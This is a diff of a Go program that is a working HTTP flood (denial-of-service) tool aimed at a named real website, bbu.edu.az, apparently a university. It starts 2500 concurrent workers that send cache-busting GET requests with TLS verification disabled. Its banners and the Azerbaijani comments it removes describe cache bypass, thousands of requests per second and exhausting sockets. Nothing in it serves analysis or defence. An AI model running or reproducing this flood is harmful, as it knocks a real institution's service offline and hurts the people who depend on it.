@@ -4,14 +4,13 @@ import (
 	"crypto/tls"
 	"fmt"
 	"math/rand"
-	"net"
 	"net/http"
 	"sync/atomic"
 	"time"
 )
 
 var (
-	target  = "bbu.edu.az:443" 
+	target  = "https://bbu.edu.az" 
 	sni     = "bbu.edu.az"
 	workers = 2500
 	count   uint64
@@ -19,9 +18,8 @@ var (
 )
 
 func main() {
-	fmt.Printf("[!!!] KATAKLİZM-X-FORCE (NATIVE) START: %s\n", sni)
+	fmt.Printf("[!!!] HAKAI-FORCE AKTİVDİR: %s\n", target)
 	
-	// Standart HTTP/2 Transport yaradırıq
 	tr := &http.Transport{
 		TLSClientConfig: &tls.Config{
 			InsecureSkipVerify: true,
@@ -30,7 +28,7 @@ func main() {
 		},
 		MaxIdleConns:        10000,
 		MaxIdleConnsPerHost: 5000,
-		ForceAttemptHTTP2:   true, // HTTP/2-ni daxili olaraq aktiv edir
+		ForceAttemptHTTP2:   true,
 	}
 
 	client := &http.Client{
@@ -42,22 +40,19 @@ func main() {
 		go func() {
 			for {
 				attack(client)
-				// Saniyədə minlərlə sorğu üçün fasiləni minimuma endirdik
 				time.Sleep(1 * time.Millisecond) 
 			}
 		}()
 	}
 
-	// Səssiz Hesabat
 	for {
 		time.Sleep(5 * time.Second)
-		fmt.Printf("[HAKAI] REQ_SENT: %d | FAIL: %d\n", atomic.LoadUint64(&count), atomic.LoadUint64(&errors))
+		fmt.Printf("[STATUS] SENT: %d | FAIL: %d\n", atomic.LoadUint64(&count), atomic.LoadUint64(&errors))
 	}
 }
 
 func attack(c *http.Client) {
-	// Cache bypass üçün dinamik URL
-	u := fmt.Sprintf("https://%s/?cache_bypass=%d&ts=%d", target, rand.Intn(999999), time.Now().UnixNano())
+	u := fmt.Sprintf("%s/?r=%d", target, rand.Intn(999999))
 	
 	req, err := http.NewRequest("GET", u, nil)
 	if err != nil {
@@ -65,18 +60,15 @@ func attack(c *http.Client) {
 		return
 	}
 
-	// Real brauzer başlığı
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-	req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0")
+	req.Header.Set("Cache-Control", "no-cache")
 	
-	// Sorğunu göndər
 	resp, err := c.Do(req)
 	if err != nil {
 		atomic.AddUint64(&errors, 1)
 		return
 	}
 	
-	// Body-ni dərhal bağla ki, socket-lər dolsun amma boşalmasın
 	resp.Body.Close()
 	atomic.AddUint64(&count, 1)
 }
